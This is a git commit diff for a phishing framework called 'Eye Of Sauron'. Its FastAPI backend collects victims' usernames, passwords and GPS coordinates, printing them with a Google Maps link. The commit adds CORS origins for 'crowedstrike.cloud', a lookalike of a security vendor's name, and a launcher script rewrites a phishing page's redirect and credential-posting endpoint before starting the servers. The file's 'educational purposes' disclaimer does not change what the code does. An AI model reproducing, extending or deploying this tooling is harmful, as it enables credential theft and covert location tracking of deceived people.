2cfc2a41ea7bb3832ee37b9537cb5842ab58f795
fistfulOfHummus <rkhalil444@gmail.com>
2025-04-15 15:11:41 +0300

    updated

--- Baradur.py
+++ Baradur.py
@@ -1,6 +1,7 @@
 from fastapi import FastAPI
 from pydantic import BaseModel
 from fastapi.middleware.cors import CORSMiddleware
+from typing import Optional, Dict
 
 app = FastAPI()
 
@@ -9,7 +10,13 @@ origins = [
     "http://localhost:8080",
     "http://127.0.0.1",
     "http://127.0.0.1:8080",
-    "http://192.168.0.108:8080"
+    "http://89.43.33.169:8080",
+    "http://crowedstrike.cloud",
+    "https://crowedstrike.cloud",
+    "http://www.crowedstrike.cloud",
+    "https://www.crowedstrike.cloud",
+    "http://api.crowedstrike.cloud",
+    "https://api.crowedstrike.cloud"
 ]
 
 app.add_middleware(
@@ -29,21 +36,29 @@ class Coordinates(BaseModel):
 class Credentials(BaseModel):
     username: str
     password: str
-    coords: Coordinates
+    coords: Optional[Coordinates] = None
 
 print('[+] Azdash Gimbtul')
 
 @app.post("/")
 async def login(credentials: Credentials):
-    print('')
-    print('[!] Got Em ;)')
-    print("[+] Username:", credentials.username)
-    print("[+] Password:", credentials.password)
-    print("[+] Latitude:", credentials.coords.latitude)
-    print("[+] Longitude:", credentials.coords.longitude)
-    mapsLink='https://www.google.com/maps/search/?api=1&query='+str(credentials.coords.latitude)+','+str(credentials.coords.longitude)
-    print("[+] Google Maps:",mapsLink)
-    print('')
+    if credentials.coords:
+        print('')
+        print('[!] Got Em ;)')
+        print("[+] Username:", credentials.username)
+        print("[+] Password:", credentials.password)
+        print("[+] Latitude:", credentials.coords.latitude)
+        print("[+] Longitude:", credentials.coords.longitude)
+        mapsLink = f'https://www.google.com/maps/search/?api=1&query={credentials.coords.latitude},{credentials.coords.longitude}'
+        print("[+] Google Maps:", mapsLink)
+        print('')
+    else:
+        print('')
+        print("[-] Client Declined Location Services")
+        print("[+] Username:", credentials.username)
+        print("[+] Password:", credentials.password)
+        print('')
+    
     return {"message": f"Welcome, {credentials.username}!"}
 
 @app.get("/abc")
--- Eye_Of_Sauron.py
+++ Eye_Of_Sauron.py
@@ -1,56 +1,98 @@
 import argparse
 import re
 import os
+import socket
+import psutil
 
-def search_and_replace(link):
-    with open('Location.html','r') as file:
-        file_contents=file.read()
-        replacemenURL='window.location.replace("'+link+'");'
-        updated_contents=re.sub('window.location.replace\(".*"\);', replacemenURL, file_contents)
-    
-    with open('index.html','w') as file:
+def get_all_ips():
+    ips = []
+    for interface, snics in psutil.net_if_addrs().items():
+        for snic in snics:
+            if snic.family == socket.AF_INET:  # Only IPv4
+                ips.append(snic.address)
+    #print(ips)
+    return(ips)
+
+def search_and_replace(link, webURL, apiURL):
+    with open('pages/Location.html', 'r') as file:
+        file_contents = file.read()
+
+    # The strings representing the redirect and the API endpoint
+    replacement_url = f'window.location.replace("{link}");'
+    api_replacement = f'const response = await fetch("{apiURL}",'
+
+    # Replace the redirect link. Works finally
+    updated_contents = re.sub(
+        r'window\.location\.replace\([\'"].*?[\'"]\)?;?',
+        replacement_url,
+        file_contents
+    )
+    with open('active/index.html', 'w') as file:
         file.write(updated_contents)
 
+    #Yeah two read writes in a row not the sexiest solution but will fix it later.
 
-def launch_Baradur():
+    with open('active/index.html', 'r') as file:
+        file_contents = file.read()
+    # Replace the fetch URL
+    updated_contents2 = re.sub(
+        r'const response = await fetch\([\'"].*?[\'"]\s*,',
+        api_replacement,
+        file_contents
+    )
+
+    with open('active/index.html', 'w') as file:
+        file.write(updated_contents2)
+
+    #For debugging
+    #print(re.findall(r'const response = await fetch\([\'"].*?[\'"]\s*,', file_contents))
+    #print(re.findall(r'window\.location\.replace\([\'"].*?[\'"]\);', file_contents))
+
+
+
+
+def launch_Baradur(api_ip, api_port, launch_web_server, web_server_port):
     print("[!]Launching FastAPI and a basic http server in different consoles")
-    os.system("x-terminal-emulator -e fastapi dev Baradur.py &") #Not the best apporach bas I like it quick n dirty
-    os.system("x-terminal-emulator -e python3 -m http.server 8080 &")
+    os.system("x-terminal-emulator -e fastapi run Baradur.py --host "+api_ip+" --port "+api_port+"&") #Not the best apporach bas I like it quick n dirty
+    if launch_web_server==True:
+        os.system("x-terminal-emulator -e bash -c 'cd active && python3 -m http.server "+web_server_port+"'")
 
 
 def program():
-    print('[!]Are ya phishing son?!')
-    print('[!]DISCLAIMER: THE DEVELOPER OF THIS SCRIPT WILL NOT BE HELD LIABLE FOR POTENTIAL DAMAGES DONE WITH IT. YOU HAVE BEEN WARNED THIS IS A TOOL FOR EDUCATIONAL PURPOSES ONLY.')
     parser=argparse.ArgumentParser(
         prog='Eye Of Sauron',
         description='Just a little phishing framework',
         epilog='The coordinates are mine Sam !'
     )
-    parser.add_argument('-l', action='store_true', help='Add to DISABLE the location tracking feature')
-    parser.add_argument('-r', required=True, help='Add a URL to redirect to when the user clicks the button: https://google.com')
-    #parser.print_help()
-    #print(sys.argv[0])
-    
+    parser.add_argument('-r', required=True, help='URL to redirect to when the user clicks the button: https://google.com')
+    parser.add_argument('-i', required=True, help='IP or domain of the machine hosting the pages.')
+    parser.add_argument('-p', required=True, help='Port of the machine hosting the web pages.')
+    parser.add_argument('--api-ip', required=True, help='IP or domain of the machine hosting fastapi. If set to localhost or the IP of this machine it will spin up a web server.')
+    parser.add_argument('--api-port', required=True, help='Port of the machine where fastapi is running.')
     args=parser.parse_args()
-    #print(f"-l flag set: {args.l}")
-    #print(f"Value for -r: {args.r}")
-    if not isinstance(args.r, str): #checks to see if the URL is a string
-        parser.error("The -r argument must be a string.")
-    if args.l==True:
-        #print('All 3 args are here')
-        search_and_replace(args.r)
-        launch_Baradur()
-        
+    machineIPs=get_all_ips()
+    launch_web_server=False
+    for x in machineIPs:
+        if args.i=='localhost' or args.i==x:
+            launch_web_server=True
+            print('[+]WebServer IP belongs to this machine. Will launch a webserver!')
+            break
+    if launch_web_server==False:
+        print('[-]Supplied ')
+    webURL='http://'+str(args.i)+':'+str(args.p)
+    apiURL='http://'+str(args.api_ip)+':'+str(args.api_port)
+    search_and_replace(args.r, webURL, apiURL)
+    launch_Baradur(args.api_ip, args.api_port, launch_web_server, args.p)
 
-    #elif args.r==None:
-    #    print('Not all 3 args here')
-    else:
-        parser.print_help()
-        return
+    return
 
 
 def __main__():
     print('[+]Eye Of Sauron')
+    print('[!]Are ya phishing son?!')
+    print('[!]DISCLAIMER: THE DEVELOPER OF THIS SCRIPT WILL NOT BE HELD LIABLE FOR POTENTIAL DAMAGES DONE WITH IT. YOU HAVE BEEN WARNED THIS IS A TOOL FOR EDUCATIONAL PURPOSES ONLY.')
     program()
-    
+
+#search_and_replace('https://test.com','lol','https://api.crowedstrike')
+
 __main__()
